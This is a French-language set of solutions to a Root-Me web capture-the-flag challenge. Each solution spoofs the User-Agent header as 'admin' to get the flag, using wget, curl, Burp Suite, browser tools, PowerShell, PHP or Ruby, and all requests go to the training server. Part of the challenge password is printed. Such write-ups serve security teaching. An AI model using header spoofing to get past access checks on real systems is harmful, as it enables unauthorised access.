@@ -1,0 +1,111 @@
+Bon, les autres solutions sont beaucoup plus élégantes que la mienne, mais comme elle n’est pas citée la voici :
+
+J’ai utilisé Burp Suite pour modifier le user agent et le mettre à admin.
+Ca se fait dans Proxy -> Options -> Match and replace
+
+ou
+
+On voit bien qu’il faut changer le User-Agent, après quelques tests avec wget, on trouve cela avec le useragent "admin" :
+
+wget -U 'admin' -O - http://challenge01.root-me.org//web-serveur/ch2/ 2>/dev/null
+<html><body><iframe style="width: 100%; height: 45px; margin: 0; padding: 0;" src="http://www.root-me.org/spip.php?page=externe_header" scrolling="no" frameborder="0"></iframe><h3>Welcome master !<br/>Password : rr$[...]Ae27</h3></body></html>
+
+ou
+
+On peut également changer l’user agent avec Curl. On teste avec admin, et ça passe !
+
+# curl -v —header "User-Agent : admin" -X GET http://challenge01.root-me.org/web-serveur/ch2/
+
+ou
+
+Pour ce challenge, j’ai téléchargé le module ’tamper data’ pour firefox :
+https://addons.mozilla.org/fr/firef...
+
+Une fois installé, il suffit de se rendre sur la page du challenge, ouvrir tamper data et cliquer sur ’altérer les données’.
+Enfin, il faut changer l’user agent (mozilla pour ma part) en "admin".
+On envoie et voila, le flag apparait.
+
+ou
+
+Avec Firefox :
+Dans
+about:config
+, créer une chaine de caractères
+general.useragent.override
+et y placer
+admin
+
+ou
+
+Pour ma part j’ai utilisé l’extension User-Agent Switcher pour Chrome puis j’ai créé un user agent avec pour seule string "admin".
+
+ou
+
+Sous Windows.
+Lancer CMD puis saisir "powershell" pour basculer en Powershell.
+
+Saisir :
+
+$req = Invoke-WebRequest -UserAgent 'admin' http://challenge01.root-me.org/web-serveur/ch2/
+
+
+Invoke-WebRequest est un équivalent du curl sous shell linux
+
+Afficher l’intégralité des éléments de la réponse obtenue par la requête :
+
+PS C:\> $req.AllElements
+
+Vous y verrez le mot magique.
+
+ou
+
+
+
+Sous Google Chrome / Chromium :
+
+- CTRL + Shift + i pour ouvrir les Developer Tools
+- Cliquer sur le petit "smartphone" en haut à gauche
+- apparaisent alors deux groupes d’options haut dessus de la page
+- dans UA override : introduire "admin"
+
+ou
+
+Un petit script en php en utilisant cURL, qui possède l’option CURLOPT_USERAGENT qui permet de spécifier un user agent.
+
+    <?php
+    $userAgent  = 'admin';
+    $curl = curl_init("http://challenge01.root-me.org/web-serveur/ch2/");
+    curl_setopt($curl, CURLOPT_USERAGENT, $userAgent);
+    $return = curl_exec($curl)."\n";
+     
+    echo $return;
+     ?>
+
+ou
+
+Avec Internet Explorer 11, sur la page du challenge :
+- touche F12 (outils de développement)
+- onglet Emulation
+- Chaine de l’agent : Personnalisé
+- Chaine personnalisée : admin
+
+ou
+
+Dans chrome :
+
+click droit > inspect element > emulation (tout en bas) > network > dans la liste des user-agent il faut choisir "others" et écrire "admin".
+
+ou
+
+On peut développer un petit script ruby pour mettre le user-agent que l’on souhaite
+Il suffit d’avoir les gem Nokogiri et Mechanize :
+
+    require 'nokogiri'                 #pour récupérer le contenu HTML
+    require 'mechanize'            # pour définir le User-Agent
+    require 'open-uri'                #pour récupérer la page
+     
+    agent=Mechanize.new     # création de l'user-agent
+    agent.user_agent="admin"          #On choisit le nom qu'on veut
+    page = agent.get('http://challenge01.root-me.org/web-serveur/ch2/')            #on récupère la page
+    html  =Nokogiri::HTML(page.body)          #on récupère le corps de la page
+    puts html          #on l'afiche sur la sortie standard
